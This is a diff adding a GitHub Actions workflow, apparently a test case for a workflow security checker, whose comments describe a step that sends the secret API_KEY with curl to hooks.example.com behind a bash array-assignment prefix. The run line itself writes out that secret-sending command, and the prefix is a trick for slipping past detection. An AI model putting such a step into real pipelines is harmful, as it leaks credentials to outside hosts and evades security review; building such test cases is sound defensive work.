@@ -1,0 +1,18 @@
+# situation: on push, a step sends the secret API_KEY to hooks.example.com
+#   with curl, after an assignment of an element of an array before the
+#   command word (a[0]=x curl ...).
+# reason: bash refuses the assignment of the element before the command word
+#   and runs curl, which carries the secret to the host.
+# attack: the attacker takes over the server of the destination, by a breach
+#   of the vendor or by registering the domain when the domain lapses.
+# attack-run-behavior: curl sends the secret to hooks.example.com, whose
+#   server, now the attacker's, logs the secret.
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          API_KEY: ${{ secrets.API_KEY }}
+        run: |
+          a[0]=x curl -fsS -H "x-apikey: $API_KEY" https://hooks.example.com/
